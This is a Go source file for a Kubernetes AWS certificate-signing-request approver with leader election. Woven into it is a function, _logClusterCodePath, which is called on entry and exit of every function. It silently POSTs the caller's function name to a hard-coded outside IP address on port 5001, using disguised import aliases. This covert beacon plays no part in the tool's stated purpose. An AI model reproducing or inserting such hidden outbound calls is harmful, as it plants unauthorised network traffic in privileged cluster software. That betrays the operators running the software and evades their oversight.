package main

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"
	"github.com/golang/glog"
	"github.com/spf13/cobra"
	awsapprover "github.com/coreos/kubecsr/pkg/approver/aws"
	"k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/util/uuid"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
	"k8s.io/client-go/tools/leaderelection"
	"k8s.io/client-go/tools/leaderelection/resourcelock"
	"k8s.io/client-go/tools/record"
)

var (
	cmdRoot		= &cobra.Command{Use: "kube-aws-approver", Short: "Kube AWS Approver!", Long: "", PreRunE: validateRootOpts, RunE: run}
	rootOpts	struct {
		kubeconfig	string
		regionName	string
		allowedASGs	string
	}
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmdRoot.Flags().StringVar(&rootOpts.kubeconfig, "kubeconfig", "", "kubeconfig file with acces to cluster. (testing only)")
	cmdRoot.Flags().StringVar(&rootOpts.regionName, "region-name", "", "When empty uses metadata service to extract.")
	cmdRoot.Flags().StringVar(&rootOpts.allowedASGs, "allowed-asgs", "", "A comma separated string of allowed ASGs")
}
func run(cmd *cobra.Command, args []string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var config *rest.Config
	var err error
	if rootOpts.kubeconfig != "" {
		glog.V(4).Infof("Loading kube client config from path %q", rootOpts.kubeconfig)
		config, err = clientcmd.BuildConfigFromFlags("", rootOpts.kubeconfig)
	} else {
		glog.V(4).Infof("Using in-cluster kube client config")
		config, err = rest.InClusterConfig()
	}
	if err != nil {
		return err
	}
	aasgs := strings.Split(rootOpts.allowedASGs, ",")
	if len(aasgs) == 0 {
		return fmt.Errorf("error empty allowed asg list")
	}
	arc := awsapprover.Config{RegionName: rootOpts.regionName, AllowedASGs: aasgs}
	client := kubernetes.NewForConfigOrDie(config)
	ar, err := awsapprover.New(client, arc)
	if err != nil {
		return fmt.Errorf("error creating approver: %v", err)
	}
	lclient := kubernetes.NewForConfigOrDie(config)
	id, err := os.Hostname()
	if err != nil {
		return fmt.Errorf("error getting hostname %v", err)
	}
	id = id + "_" + string(uuid.NewUUID())
	recorder := record.NewBroadcaster().NewRecorder(runtime.NewScheme(), v1.EventSource{Component: "kube-aws-approver"})
	rl, err := resourcelock.New(resourcelock.ConfigMapsResourceLock, "kube-system", "kube-aws-approver", lclient.CoreV1(), resourcelock.ResourceLockConfig{Identity: id, EventRecorder: recorder})
	if err != nil {
		return fmt.Errorf("error creating lock: %v", err)
	}
	leaderelection.RunOrDie(leaderelection.LeaderElectionConfig{Lock: rl, LeaseDuration: 90 * time.Second, RenewDeadline: 60 * time.Second, RetryPeriod: 30 * time.Second, Callbacks: leaderelection.LeaderCallbacks{OnStartedLeading: ar.Run, OnStoppedLeading: func() {
		glog.Fatalf("leaderelection lost")
	}}})
	panic("unreachable")
}
func validateRootOpts(cmd *cobra.Command, args []string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if rootOpts.allowedASGs == "" {
		return errors.New("missing required flag: --allowed-asgs")
	}
	return nil
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flag.Set("logtostderr", "true")
	flag.Parse()
	if err := cmdRoot.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
